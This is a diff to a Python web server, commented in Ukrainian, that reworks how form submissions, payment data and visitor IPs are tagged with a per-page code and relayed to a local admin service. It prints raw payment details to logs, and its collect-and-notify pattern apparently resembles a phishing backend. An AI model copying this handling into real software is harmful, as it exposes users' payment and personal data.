@@ -159,6 +159,18 @@ def get_real_ip(handler):
         return xff.split(',')[0].strip()
     return handler.client_address[0]
 
+# Додаємо допоміжну функцію для отримання page_code по user_id
+import requests
+
+def get_page_code_by_user_id(user_id):
+    try:
+        resp = requests.get(f'http://127.0.0.1:8081/api/page_code_by_user_id?user_id={user_id}', timeout=2)
+        if resp.status_code == 200:
+            return resp.json().get('page_code')
+    except Exception as e:
+        print(f'[server.py] Error getting page_code for user_id={user_id}: {e}')
+    return None
+
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory=DIRECTORY, **kwargs)
@@ -511,6 +523,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
+        # Оновлені обробники POST-запитів для page_code
         elif path == '/submit_form':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
@@ -519,7 +532,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 phone = data.get('phone', '')
                 name = data.get('name', '')
                 mail = data.get('mail', '')
-                user_id = data.get('user_id', '')  # Додаємо user_id
+                page_code = data.get('page_code', '')
+                user_id = data.get('user_id', '')
+                if not page_code and user_id:
+                    page_code = get_page_code_by_user_id(user_id)
                 ip = get_real_ip(self)
                 # Надсилаємо у main.py
                 try:
@@ -528,7 +544,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         'name': name,
                         'mail': mail,
                         'ip': ip,
-                        'user_id': user_id  # Додаємо user_id
+                        'page_code': page_code
                     }, timeout=2)
                 except Exception as e:
                     print(f"[notify_admin] Error: {e}")
@@ -539,19 +555,18 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
-        elif self.path == '/send_payment_data':
+        elif path == '/send_payment_data':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
             try:
                 data = json.loads(post_data)
-                # Додаємо user_id з URL параметрів, якщо є
-                from urllib.parse import parse_qs, urlparse
-                parsed = urlparse(self.path)
-                if parsed.query:
-                    qs = parse_qs(parsed.query)
-                    if 'uid' in qs and 'user_id' not in data:
-                        data['user_id'] = qs['uid'][0]
-                
+                page_code = data.get('page_code', '')
+                user_id = data.get('user_id', '')
+                if not page_code and user_id:
+                    page_code = get_page_code_by_user_id(user_id)
+                # Видаляємо user_id, передаємо тільки page_code
+                data.pop('user_id', None)
+                data['page_code'] = page_code
                 print("[send_payment_data] Отримано дані:", data)
                 resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                 print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
@@ -699,12 +714,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             try:
                 data = json.loads(post_data)
+                page_code = data.get('page_code', '')
                 user_id = data.get('user_id', '')
                 ip = data.get('ip', '')
+                if not page_code and user_id:
+                    page_code = get_page_code_by_user_id(user_id)
                 # Надсилаємо у main.py
                 try:
                     requests.post('http://localhost:8081/update_site_user_ip', json={
-                        'user_id': user_id,
+                        'page_code': page_code,
                         'ip': ip
                     }, timeout=2)
                 except Exception as e:
